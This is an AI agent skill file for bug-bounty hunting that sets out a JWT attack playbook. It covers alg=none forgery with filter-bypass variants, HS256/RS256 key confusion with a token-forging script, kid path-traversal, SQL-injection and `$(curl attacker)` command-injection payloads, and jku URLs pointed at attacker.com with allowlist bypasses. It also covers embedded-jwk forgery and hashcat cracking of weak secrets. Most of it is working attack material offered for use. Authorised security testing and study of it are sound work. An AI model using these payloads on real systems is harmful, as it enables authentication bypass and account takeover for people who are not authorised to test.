---
name: hunt-jwt
description: JSON Web Token attack — alg=none, HS/RS confusion, kid injection, JKU/X5U abuse, weak secret crack.
keywords: [jwt, jws, jwe, alg none, hs256, rs256, kid, jku, jwk, jwt secret, token forgery]
---

# hunt-jwt

## When this skill loads

Triggers: "jwt", "json web token", "alg=none", "rs256", "hs256",
"kid", "jku", "jwk header", "token forgery".

## Decode first

```
echo "<token>" | cut -d. -f1 | base64 -d  # header
echo "<token>" | cut -d. -f2 | base64 -d  # payload
```

Or jwt.io. Note the `alg`, `kid`, `jku`, `x5u`, `jwk` header values.

## Phase 1 — `alg=none`

Set header `{"alg":"none","typ":"JWT"}`, payload as desired, append
empty signature:

```
<base64(header)>.<base64(payload)>.
```

Disclosed in countless libs (jsonwebtoken < 4.2.2,
node-jsonwebtoken < 9, etc).

Variants to defeat case-only filters:

```
"alg":"none"     "alg":"None"     "alg":"NONE"     "alg":"nOne"
```

## Phase 2 — HS/RS confusion

When server uses RS256 but `jwt.verify` is called with the public
key as the symmetric secret, switch `alg` to `HS256` and sign with
the PEM-encoded public key:

```bash
PUBKEY=$(cat pubkey.pem)
python3 -c "
import jwt, sys
print(jwt.encode({'sub':'admin'}, '$PUBKEY', algorithm='HS256'))
"
```

Public key sources:
- `/.well-known/jwks.json`
- IdP metadata
- HTML page meta tags
- Recovered from a signature with known plaintext (uncommon)

## Phase 3 — `kid` injection

`kid` (key ID) is operator-controlled and frequently used unsafely:

- **Path traversal**: `kid=../../../../dev/null` → signature is HMAC
  of empty content; forge with empty key.
- **SQL injection**: `kid=1' UNION SELECT 'attackerkey'-- ` if `kid`
  feeds a DB lookup.
- **Command injection**: rare but `kid=$(curl attacker)` if shelled out.
- **Predictable kid**: enumerate from 1..N if integer.

## Phase 4 — `jku` / `x5u` abuse

`jku` (JWK Set URL) tells the verifier where to fetch the public key.
If unconstrained:

```
jku: https://attacker.com/jwks.json
```

Host a JWK file with your own keypair, sign tokens with your private
key — server fetches your public key and validates ✅.

Mitigations to test:
- Allowlist of trusted `jku` hosts
- Same-origin requirement
- Pinned JWK Set

Bypasses if allowlist matches by prefix or suffix:

```
jku: https://idp.example.com@attacker.com/jwks.json
jku: https://attacker.com/jwks.json#idp.example.com
jku: https://idp.example.com.attacker.com/jwks.json
```

## Phase 5 — embedded `jwk`

Some libs accept a key embedded in the header:

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

Sign with the embedded key's private half. Server validates against
the header-embedded key — full forgery.

## Phase 6 — weak HS256 secret crack

```bash
hashcat -m 16500 token.jwt rockyou.txt
# or
jwt2john.py token.jwt > hash && john hash -w=rockyou.txt
```

Common weak secrets: `secret`, `your-256-bit-secret`, `changeme`,
default framework values (Express `'secret'`, Flask `dev`,
Spring `JwtSecret`).

## Phase 7 — replay / token-reuse

- Logout doesn't invalidate? Replay after logout.
- `nbf` (not-before) and `exp` enforcement? Set both far future.
- `jti` replay protection? Often missing.

## Phase 8 — confused deputy across services

If multiple services share a JWT but each accepts a different
`aud`:

- Internal-only service accepts `aud=internal` — leak that token
  from an external token, replay to internal.
- Cross-tenant: `iss` not pinned → same JWT works on tenant B if
  tenant B trusts the issuer.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2015-9235 | jsonwebtoken `alg=none` |
| CVE-2022-21449 | Java 15+ ECDSA-P256 — accepts `(0,0)` signature for any token |
| CVE-2018-0114 | python-jose RS/HS confusion |
| H1 #738109 (Authelia) | `kid` path traversal to `/dev/null` |
| H1 #826358 (Auth0) | JKU allowlist bypass via `@` userinfo |
| CVE-2024-54150 | cjose null-pointer dereference / signature skip |

## Never-submit fallbacks

- "JWT not properly verified" without producing a forged token that
  the server accepts → KILL.
- Weak secret found via dictionary but no functional impact path
  (e.g., JWT used only for analytics) → DOWNGRADE.

## See also

- `hunt-oauth` — id_token forgery flows
- `hunt-deserialization` — JWT sometimes embeds objects
- `m365-entra-attack`, `okta-attack` — IdP-specific JWT quirks
